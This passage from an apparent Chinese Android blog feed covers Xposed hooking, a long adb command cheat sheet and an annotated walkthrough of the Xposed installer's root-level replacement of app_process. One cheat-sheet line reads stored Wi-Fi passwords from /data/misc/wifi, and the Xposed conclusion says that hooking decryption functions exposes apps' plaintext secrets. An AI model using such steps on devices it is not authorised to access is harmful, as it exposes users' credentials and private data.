class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">awaitLoadedLocked</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (!mLoaded) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                wait();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException unused) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getFileContent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">            awaitLoadedLocked();</span><br><span class="line">            <span class="keyword">return</span> mFileOutputStream.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> JSONObject <span class="title">getJsonFileContent</span><span class="params">()</span> <span class="keyword">throws</span> JSONException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> JSONObject(getFileContent());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="判断xposed框架是否生效">判断xposed框架是否生效</h2><p>&#160;&#160;&#160;&#160;正如上边所说，xposed框架中对文件只有读权限，因此获取信息就变成了单项了，xposed进程只能根据我们的配置文件进行相应的逻辑操作。由于应用进程和xposed进程是不同的进程，如果应用进程要判断xposed框架是否启用，就需要进程间数据通信，如果仅仅只是判断xposed是否启动而去启动一个服务处理数据，感觉有点小题大做了。这里给出一种简单有效的方法。</p>
<blockquote>
<p>1.首先我们生成一个配置文件<code>setting.xml</code><br>2.定义一个函数</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setXposedStatus</span><span class="params">(<span class="keyword">boolean</span> bStatus)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.getSharedPreferences(<span class="string">"setting"</span>, Context.MODE_WORLD_READABLE).edit().putBoolean(<span class="string">"xposed_enabled"</span>, bStatus).apply();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>3.应用每次启动时候调用函数<code>setXposedStatus</code><br>4.在xposed中hook函数<code>setXposedStatus</code>调用前，并将参数改为<code>true</code></p>
</blockquote>
<p>这样我们要想知道xposed框架是否生效可用，读取<code>setting.xml</code>中<code>xposed_enabled</code>字段值即可。</p>
<h2 id="总结">总结</h2><p>&#160;&#160;&#160;&#160;xposed框架不仅能够hook任意你想hook的函数，并且自身也有一个很大的特点，就是一旦用户安装并启用，你所有的操作都不需要任何权限就可实现。基于xposed框架的优秀应用也特别多，比如著名的省电应用<code>绿色守护</code>。再如有一些app对敏感数据进行加密，加密算法又很复杂，那么通过hook解密函数就可以轻松的拿到明文。xposed框架的奇妙之处远远不仅于此，国外也有人对其进行二次封装作出了更神奇的用法，例如<a href="https://github.com/seebye/XClasses" target="_blank" rel="external">XClasses</a>，如果你有什么奇淫技巧，我只想对你说四个字，请带上我！</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>&#160;&#160;&#160;&#160;之前只是简单的了解了一下xposed框架，知道如何hook函数，并没有深入去使用，也不知道这个框架能用到哪种程度，最近详细的总结了下，简单来说就是，没有hook不到的地方，只有你想不到的地方。</p>
<h2 id="接管系统]]>
    </summary>
    
      <category term="xposed" scheme="http://blog.idhyt.xyz/tags/xposed/"/>
    
      <category term="android" scheme="http://blog.idhyt.xyz/categories/android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[adb shell常用命令]]></title>
    <link href="http://blog.idhyt.xyz/2015/10/31/4-android-adb-shell-command/"/>
    <id>http://blog.idhyt.xyz/2015/10/31/4-android-adb-shell-command/</id>
    <published>2015-10-31T03:45:11.000Z</published>
    <updated>2015-12-27T09:44:18.000Z</updated>
    <content type="html"><![CDATA[<ul>
<li><p>获取序列号：<br><code>adb get-serialno</code></p>
</li>
<li><p>查看连接计算机的设备：<br><code>adb devices</code></p>
</li>
<li><p>查看模拟器/设施的当前状态:<br><code>adb get-state</code></p>
</li>
<li><p>多设备下连接目标设备：<br><code>adb -s xxx shell</code></p>
</li>
<li><p>重启机器：<br><code>adb reboot</code></p>
</li>
<li><p>重启到bootloader，即刷机模式：<br><code>adb reboot bootloader</code></p>
</li>
<li><p>重启到recovery，即恢复模式：<br><code>adb reboot recovery</code></p>
</li>
<li><p>查看log：<br><code>adb logcat</code></p>
</li>
<li><p>终止adb服务进程：<br><code>adb kill-server</code></p>
</li>
<li><p>重启adb服务进程：<br><code>adb start-server</code></p>
</li>
<li><p>查看Service列表<br><code>adb shell service list</code><br><code>adb shell dumpsys activity services</code></p>
</li>
</ul>
<ul>
<li>检查Service是否存在<br><code>adb shell service check phone</code></li>
</ul>
<ul>
<li><p>获取机器MAC地址：<br><code>adb shell  cat /sys/class/net/wlan0/address</code></p>
</li>
<li><p>获取CPU序列号：<br><code>adb shell cat /proc/cpuinfo</code></p>
</li>
<li><p>安装APK：<br><code>adb install &lt;apkfile&gt; //比如：adb install baidu.apk</code></p>
</li>
<li><p>保留数据和缓存文件，重新安装apk：<br><code>adb install -r &lt;apkfile&gt; //比如：adb install -r baidu.apk</code></p>
</li>
<li><p>安装apk到sd卡：<br><code>adb install -s &lt;apkfile&gt; // 比如：adb install -s baidu.apk</code></p>
</li>
<li><p>卸载APK：<br><code>adb uninstall &lt;package&gt; //比如：adb uninstall com.baidu.search</code></p>
</li>
<li><p>卸载app但保留数据和缓存文件：<br><code>adb uninstall -k &lt;package&gt; //比如：adb uninstall -k com.baidu.search</code></p>
</li>
<li><p>启动应用：<br><code>adb shell am start -n &lt;package_name&gt;/.&lt;activity_class_name&gt;</code></p>
</li>
<li><p>查看数据库：<br><code>adb shell content query --uri  content://settings/secure</code></p>
</li>
<li><p>查看设备cpu和内存占用情况：<br><code>adb shell top</code></p>
</li>
<li><p>查看占用内存前6的app：<br><code>adb shell top -m 6</code></p>
</li>
<li><p>刷新一次内存信息，然后返回：<br><code>adb shell top -n 1</code></p>
</li>
<li><p>查询各进程内存使用情况：<br><code>adb shell procrank</code></p>
</li>
<li><p>启动应用程序:<br><code>adb shell am</code></p>
</li>
<li><p>杀死一个进程：<br><code>adb shell kill [pid]</code></p>
</li>
<li><p>查看进程列表：<br><code>adb shell ps</code></p>
</li>
<li><p>查看Android系统的属性<br><code>adb shell prop</code></p>
</li>
<li><p>查看指定进程状态：<br><code>adb shell ps -x [PID]</code></p>
</li>
<li><p>查看后台services信息：<br><code>adb shell service list</code></p>
</li>
<li><p>adb 查看最上层成activity名字：</p>
<blockquote>
<p>linux:<br><code>adb shell dumpsys activity | grep &quot;mFocusedActivity&quot;</code><br>windows:<br><code>adb shell dumpsys activity | findstr &quot;mFocusedActivity&quot;</code></p>
</blockquote>
</li>
<li><p>查看当前内存占用：<br><code>adb shell cat /proc/meminfo</code></p>
</li>
<li><p>查看IO内存分区：<br><code>adb shell cat /proc/iomem</code></p>
</li>
<li><p>将system分区重新挂载为可读写分区：<br><code>adb remount</code></p>
</li>
<li><p>从本地复制文件到设备：<br><code>adb push &lt;local&gt; &lt;remote&gt;</code></p>
</li>
<li><p>从设备复制文件到本地：<br><code>adb pull &lt;remote&gt; &lt;local&gt;</code></p>
</li>
<li><p>列出目录下的文件和文件夹，等同于dos中的dir命令：<br><code>adb shell ls</code></p>
</li>
<li><p>进入文件夹，等同于dos中的cd 命令：<br><code>adb shell cd &lt;folder&gt;</code></p>
</li>
<li><p>重命名文件：<br><code>adb shell rename path/oldfilename path/newfilename</code> </p>
</li>
<li><p>删除system/avi.apk：<br><code>adb shell rm /system/avi.apk</code></p>
</li>
<li><p>删除文件夹及其下面所有文件：<br><code>adb shell rm -r &lt;folder&gt;</code> </p>
</li>
<li><p>移动文件：<br><code>adb shell mv path/file newpath/file</code></p>
</li>
<li><p>设置文件权限：<br><code>adb shell chmod 777 /system/fonts/DroidSansFallback.ttf</code></p>
</li>
<li><p>新建文件夹：<br><code>adb shell mkdir path/foldelname</code></p>
</li>
<li><p>查看文件内容：<br><code>adb shell cat &lt;file&gt;</code> </p>
</li>
<li><p>查看wifi密码：<br><code>adb shell cat /data/misc/wifi/*.conf</code> </p>
</li>
<li><p>清除log缓存：<br><code>adb logcat -c</code></p>
</li>
<li><p>查看bug报告：<br><code>adb bugreport</code></p>
</li>
<li><p>获取设备名称：<br><code>adb shell cat /system/build.prop</code></p>
</li>
<li><p>查看ADB帮助：<br><code>adb help</code></p>
</li>
<li><p>跑monkey：<br><code>adb shell monkey -v -p your.package.name 500</code></p>
</li>
<li><p>dump堆栈：<br><code>debuggerd -b &lt;pid&gt;</code></p>
</li>
<li><p>备份与恢复:</p>
<blockquote>
<p>备份：<br><code>adb backup -f c:\allowBackup.ab -noapk com.ijinshan.browser_fast</code><br>恢复：<br><code>adb restore &quot;c:\allowBackup.ab&quot;</code></p>
</blockquote>
</li>
<li><p>拷贝文件(这些命令都是在adb下用，而不是在shell中用):</p>
<blockquote>
<p>push从电脑端向手机复制文件:<br><code>adb push d:/adb/test.txt /data/data/download/</code><br>pull从手机端向本地复制文件:<br><code>adb pull /data/data/download/ d:/adb/</code></p>
</blockquote>
</li>
<li><p>查看应用程序内存使用情况:<br><code>adb shell dumpsys meminfo &lt;package_name&gt;</code></p>
<blockquote>
<p>其中，package_name 也可以换成程序的pid,<br>pid可以通过 <code>adb shell top | grep app_name</code> 来查找.<br>内存使用情况参考<code>http://blog.csdn.net/bigconvience/article/details/35553983</code></p>
</blockquote>
</li>
<li><p>查看进程占用cpu的情况:<br><code>adb shell top -n 1 -d 0.5 | grep proc_ id</code></p>
</li>
<li><p>procrank查看内存占用：<br><code>adb shell procrank</code></p>
<blockquote>
<p>VSS - Virtual Set Size 虚拟耗用内存（包含共享库占用的内存）<br>RSS - Resident Set Size 实际使用物理内存（包含共享库占用的内存）<br>PSS - Proportional Set Size 实际使用的物理内存（比例分配共享库占用的内存）<br>USS - Unique Set Size 进程独自占用的物理内存（不包含共享库占用的内存）</p>
</blockquote>
</li>
</ul>
<ul>
<li><p>快速查看apk内androidmanifest文件内容:<br><code>aapt dump xmltree xxxx.apk AndroidManifest.xml</code></p>
</li>
<li><p>列出一些系统信息和所有应用的信息:<br><code>adb shell dumpsys packages &gt; d:\\packages.txt</code></p>
</li>
<li><p>列出一些指定应用的信息:<br><code>adb shell dumpsys package com.ijinshan.duba &gt; d:\\duba.txt</code></p>
</li>
<li><p>查看当前谁持有WAKE_LOCK锁对象：<br><code>adb shell dumpsys power</code></p>
</li>
<li><p>查看电池用量详情：<br><code>adb shell dumpsys batteryinfo</code></p>
</li>
<li><p>搜索文件：<br><code>busybox find -name *xxx*</code></p>
</li>
<li><p>电池日志：<br><code>adb shell dumpsys batterystats &gt; x:\batterystats.txt</code><br><code>bugreport日志：adb bugreport &gt; x:\bugreport.txt</code></p>
</li>
<li><p>电池日志图形界面查看<br><code>https://github.com/cacker/battery-historian</code></p>
</li>
<li><p>查看应用uid<br><code>cat /proc/&lt;pid&gt;/status</code><br><code>cat /data/system/packages.list | grep xxx</code></p>
</li>
<li><p>cpu频率<br>查看：<br><code>cat [%cpuFreqPath%]/cpuinfo_cur_freq (当前cpu频率)</code><br>修改：<br><code>echo xxx &gt; /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor</code></p>
<blockquote>
<p>cat /sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_cur_freq   (当前cpu频率)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_max_freq  (最大cpu频率)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_min_freq  (最小cpu频率)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/related_cpus  (cpu数量标号,从0开始,如果是双核,结果为0,1)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_available_frequencies  (cpu所有可用频率)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_available_governors  (cpu所有可用调控模式)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor (当前使用哪种调控模式)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_transition_latency (变频延迟)</p>
</blockquote>
</li>
</ul>
<ul>
<li><p>某个应用内存消耗信息<br><code>adb shell dumpsys meminfo sina.mobile.tianqitong &gt; d:\\meminfo.txt</code></p>
</li>
<li><p>zygote的堆栈dump</p>
<blockquote>
<p>adb shell // 进入shell<br>chmod 777 /data/anr // /data/anr设置可读写权限<br>rm -r traces.txt // 删除原始traces<br>adb shell ps //查看进程pid<br>kill -3 <pid> //<br>adb pull /data/anr/traces.txt d:/trace.txt<br><strong>trace中查看cpu调度的基本信息</strong></pid></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">"Thread-196" prio=5 tid=27 SUSPENDED</span><br><span class="line">| sysTid=2271 nice=0 sched=0/0 cgrp=apps/bg_non_interactive handle=1543812984</span><br><span class="line">| state=S schedstat=( 1177036142201 119659820902 234955 ) utm=84431 stm=33272 core=0</span><br><span class="line">#00  pc 000217a8  /system/lib/libc.so (__futex_syscall3+8)</span><br><span class="line">#01  pc 0000e09c  /system/lib/libc.so (__pthread_cond_timedwait_relative+48)</span><br><span class="line">#02  pc 0000e0f8  /system/lib/libc.so (__pthread_cond_timedwait+60)</span><br><span class="line">#03  pc 0005419d  /system/lib/libdvm.so (dvmChangeStatus(Thread*, ThreadStatus)+72)</span><br><span class="line">#04  pc 00049995  /system/lib/libdvm.so</span><br><span class="line">#05  pc 0004b9c1  /system/lib/libdvm.so</span><br><span class="line">#06  pc 0006e721  /system/lib/libandroid_runtime.so</span><br><span class="line">#07  pc 0001e610  /system/lib/libdvm.so (dvmPlatformInvoke+112)</span><br><span class="line">#08  pc 0004df29  /system/lib/libdvm.so (dvmCallJNIMethod(unsigned int const*, JValue*, Method const*, Thread*)+500)</span><br><span class="line">#09  pc 00027a24  /system/lib/libdvm.so</span><br><span class="line">#10  pc 000fedc8  [stack:2271]</span><br><span class="line">at android.util.Log.println_native(Native Method)</span><br><span class="line">at android.util.Log.println(Log.java:332)</span><br><span class="line">at com.android.internal.os.AndroidPrintStream.log(AndroidPrintStream.java:47)</span><br><span class="line">at com.android.internal.os.LoggingPrintStream.println(LoggingPrintStream.java:311)</span><br><span class="line">at java.net.PlainSocketImpl.read(PlainSocketImpl.java:487)</span><br><span class="line">at java.net.PlainSocketImpl.access$000(PlainSocketImpl.java:46)</span><br><span class="line">at java.net.PlainSocketImpl$PlainSocketInputStream.read(PlainSocketImpl.java:240)</span><br><span class="line">at java.io.InputStream.read(InputStream.java:163)</span><br><span class="line">at java.io.BufferedInputStream.fillbuf(BufferedInputStream.java:142)</span><br><span class="line">at java.io.BufferedInputStream.read(BufferedInputStream.java:309)</span><br><span class="line">at com.sina.push.i.c.c(SourceFile:241)</span><br><span class="line">at com.sina.push.i.c.b(SourceFile:133)</span><br><span class="line">at com.sina.push.i.c.d(SourceFile:270)</span><br><span class="line">at com.sina.push.i.c.e(SourceFile:496)</span><br><span class="line">at com.sina.push.i.c.&lt;init&gt;(SourceFile:97)</span><br><span class="line">at com.sina.push.b.a.b.a(SourceFile:56)</span><br><span class="line">at com.sina.push.b.e.a(SourceFile:166)</span><br><span class="line">at com.sina.push.b.e$b$a.run(SourceFile:487)</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
</ul>
<p>其中<code>schedstat=( 1177036142201 119659820902 234955 ) utm=84431 stm=33272 core=0</code><br>从左到右六个数字分别是:<br>1- 当前线程在cpu上消耗的时间<br>2- 当前任务在CPU任务轮询中的等待时间<br>3- 当前线程在这个cpu上运行的次数<br>4- 当前线程的用户态执行时间<br>5- 当前线程的内核态执行时间<br>6- 当前线程在哪里个核心上执行<br>实际上描述了调度的基本信息</p>
<ul>
<li>SYSTEM LOG<br><code>logcat -b system -v time -d *:v | grep sina.mobile</code><blockquote>
<p>-b <buffer> // 加载一个可使用的日志缓冲区供查看，比如event和radio,默认值是main.<br>system // system log<br>-v // 输出字段 time 显示时间<br>-d // 缓冲区日志打印并退出<br>*:v // 日志级别高到低 E W I D V<br>grep sina.mobile // 过滤包含sina.mobile的信息</buffer></p>
</blockquote>
</li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<ul>
<li><p>获取序列号：<br><code>adb get-serialno</code></p>
</li>
<li><p>查看连接计算机的设备：<br><code>adb devices</code></p>
</li>
<li><p>查看模拟器/设施的当前状态:]]>
    </summary>
    
      <category term="adb" scheme="http://blog.idhyt.xyz/tags/adb/"/>
    
      <category term="android" scheme="http://blog.idhyt.xyz/categories/android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[安卓注入框架Xposed分析与简单应用]]></title>
    <link href="http://blog.idhyt.xyz/2015/09/25/4-android-injection-xposed/"/>
    <id>http://blog.idhyt.xyz/2015/09/25/4-android-injection-xposed/</id>
    <published>2015-09-24T18:29:11.000Z</published>
    <updated>2015-12-26T07:45:35.000Z</updated>
    <content type="html"><![CDATA[<h3 id="概述">概述</h3><p>Xposed是针对Android平台的动态劫持项目，源码<a href="https://github.com/rovo89" target="_blank" rel="external">github</a></p>
<h4 id="主要模块说明如下：">主要模块说明如下：</h4><p><strong>Xposed</strong>：Xposed的C++部分，主要是用来替换/system/bin/app_process，并为XposedBridge提供JNI方法。</p>
<p><strong>XposedInstaller</strong>：Xposed的安装包，负责配置Xposed工作的环境并且提供对基于Xposed框架的Modules的管理。在安装XposedInstaller之后，app_process与XposedBridge.jar放置在了/data/data/de.robv.android.xposed.installer。</p>
<p><strong>XposedBridge.jar</strong>：XposedBridge.jar是Xposed提供的jar文件，负责在Native层与FrameWork层进行交互。/system/bin/app_process进程启动过程中会加载该jar包，其它的Modules的开发与运行都是基于该jar包的。注意：XposedBridge.jar文件本质上是由XposedBridge生成的APK文件更名而来，查看该工程目录下的install.bat</p>
<pre><code><span class="label">cd</span> /d %~dp0
<span class="label">dir</span> <span class="keyword">bin\XposedBridge.apk
</span><span class="label">adb</span> <span class="keyword">push </span><span class="keyword">bin\XposedBridge.apk </span>/<span class="preprocessor">data</span>/<span class="preprocessor">data</span>/de.robv.<span class="keyword">android.xposed.installer/bin/XposedBridge.jar.newversion
</span><span class="label">pause</span>
</code></pre><p><strong>XposedMods</strong>：使用Xposed开发的一些Modules，其中AppSettings是一个可以进行权限动态管理的应用</p>
<h4 id="Xposed框架的基本运行环境如下：">Xposed框架的基本运行环境如下：</h4><table>
<thead>
<tr>
<th>Configuration</th>
<th>RequireMent</th>
</tr>
</thead>
<tbody>
<tr>
<td>Root Access</td>
<td>因为Xposed工作原理是在/system/bin目录下替换文件，在install的时候需要root权限，但是运行时不需要root权限</td>
</tr>
<tr>
<td>版本要求</td>
<td>需要在Android 4.0以上版本的机器中</td>
</tr>
</tbody>
</table>
<h3 id="源码分析">源码分析</h3><h4 id="XposedInstaller">XposedInstaller</h4><p>通过<code>/XposedInstaller/AndroidManifest.xml</code>看出主activity为WelcomeActivity，<br>主要实现了界面加载，添加功能图标和描述信息Item，如Install, Modules, Download等。<br>选择Framework后进入界面<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-xposed-1.jpg" alt="android-xposed-1"></p>
<p>我们直接找到install代码，install代码定位的简单方法：<br>先点击install进入安装界面，然后在输入adb命令查看当前最顶层activity，就可以定位到代码。</p>
<p>adb 查看最上层成activity名字<br>linux: <code>adb shell dumpsys activity | grep &quot;mFocusedActivity&quot;</code><br>windows: <code>adb shell dumpsys activity | findstr &quot;mFocusedActivity&quot;</code></p>
<p>最后定位到install代码位于InstallerFragment中，代码及注释如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 该代码的功能就是替换了app_process文件</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">install</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取安装的方式，直接写入 or 使用 recovery进行安装</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> installMode = getInstallMode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查获取Root权限</span></span><br><span class="line">    <span class="keyword">if</span> (!startShell())</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    List&lt;String&gt; messages = <span class="keyword">new</span> LinkedList&lt;String&gt;();</span><br><span class="line">    <span class="keyword">boolean</span> showAlert = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        messages.add(getString(R.string.sdcard_location, XposedApp.getInstance().getExternalFilesDir(<span class="keyword">null</span>)));</span><br><span class="line">        messages.add(<span class="string">""</span>);</span><br><span class="line"></span><br><span class="line">        messages.add(getString(R.string.file_copying, <span class="string">"Xposed-Disabler-Recovery.zip"</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 把Xposed-Disabler-Recovery.zip文件 从asset copy到sdcard中</span></span><br><span class="line">        <span class="keyword">if</span> (AssetUtil.writeAssetToSdcardFile(<span class="string">"Xposed-Disabler-Recovery.zip"</span>, <span class="number">00644</span>) == <span class="keyword">null</span>) &#123;</span><br><span class="line">            messages.add(<span class="string">""</span>);</span><br><span class="line">            messages.add(getString(R.string.file_extract_failed, <span class="string">"Xposed-Disabler-Recovery.zip"</span>));</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将编译后的app_process二进制文件，从asset文件夹中，copy到/data/data/de.robv.android.xposed.installer/bin/app_process</span></span><br><span class="line">        File appProcessFile = AssetUtil.writeAssetToFile(APP_PROCESS_NAME, <span class="keyword">new</span> File(XposedApp.BASE_DIR + <span class="string">"bin/app_process"</span>), <span class="number">00700</span>);</span><br><span class="line">        <span class="keyword">if</span> (appProcessFile == <span class="keyword">null</span>) &#123;</span><br><span class="line">            showAlert(getString(R.string.file_extract_failed, <span class="string">"app_process"</span>));</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (installMode == INSTALL_MODE_NORMAL) &#123;</span><br><span class="line">            <span class="comment">// 普通安装模式</span></span><br><span class="line">            <span class="comment">// 重新挂载/system为rw模式</span></span><br><span class="line">            <span class="comment">// Normal installation</span></span><br><span class="line">            messages.add(getString(R.string.file_mounting_writable, <span class="string">"/system"</span>));</span><br><span class="line">            <span class="keyword">if</span> (mRootUtil.executeWithBusybox(<span class="string">"mount -o remount,rw /system"</span>, messages) != <span class="number">0</span>) &#123;</span><br><span class="line">                messages.add(getString(R.string.file_mount_writable_failed, <span class="string">"/system"</span>));</span><br><span class="line">                messages.add(getString(R.string.file_trying_to_continue));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 查看原有的app_process文件是否已经备份，如果没有备份，现将原有的app_process文件备份一下</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">new</span> File(<span class="string">"/system/bin/app_process.orig"</span>).exists()) &#123;</span><br><span class="line">                messages.add(getString(R.string.file_backup_already_exists, <span class="string">"/system/bin/app_process.orig"</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (mRootUtil.executeWithBusybox(<span class="string">"cp -a /system/bin/app_process /system/bin/app_process.orig"</span>, messages) != <span class="number">0</span>) &#123;</span><br><span class="line">                    messages.add(<span class="string">""</span>);</span><br><span class="line">                    messages.add(getString(R.string.file_backup_failed, <span class="string">"/system/bin/app_process"</span>));</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    messages.add(getString(R.string.file_backup_successful, <span class="string">"/system/bin/app_process.orig"</span>));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                mRootUtil.executeWithBusybox(<span class="string">"sync"</span>, messages);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将项目中的自定义app_process文件copy覆盖系统的app_process,修改权限</span></span><br><span class="line">            messages.add(getString(R.string.file_copying, <span class="string">"app_process"</span>));</span><br><span class="line">            <span class="keyword">if</span> (mRootUtil.executeWithBusybox(<span class="string">"cp -a "</span> + appProcessFile.getAbsolutePath() + <span class="string">" /system/bin/app_process"</span>, messages) != <span class="number">0</span>) &#123;</span><br><span class="line">                messages.add(<span class="string">""</span>);</span><br><span class="line">                messages.add(getString(R.string.file_copy_failed, <span class="string">"app_process"</span>, <span class="string">"/system/bin"</span>));</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (mRootUtil.executeWithBusybox(<span class="string">"chmod 755 /system/bin/app_process"</span>, messages) != <span class="number">0</span>) &#123;</span><br><span class="line">                messages.add(<span class="string">""</span>);</span><br><span class="line">                messages.add(getString(R.string.file_set_perms_failed, <span class="string">"/system/bin/app_process"</span>));</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (mRootUtil.executeWithBusybox(<span class="string">"chown root:shell /system/bin/app_process"</span>, messages) != <span class="number">0</span>) &#123;</span><br><span class="line">                messages.add(<span class="string">""</span>);</span><br><span class="line">                messages.add(getString(R.string.file_set_owner_failed, <span class="string">"/system/bin/app_process"</span>));</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (installMode == INSTALL_MODE_RECOVERY_AUTO) &#123;</span><br><span class="line">            <span class="comment">// 自动进入Recovery</span></span><br><span class="line">            <span class="keyword">if</span> (!prepareAutoFlash(messages, <span 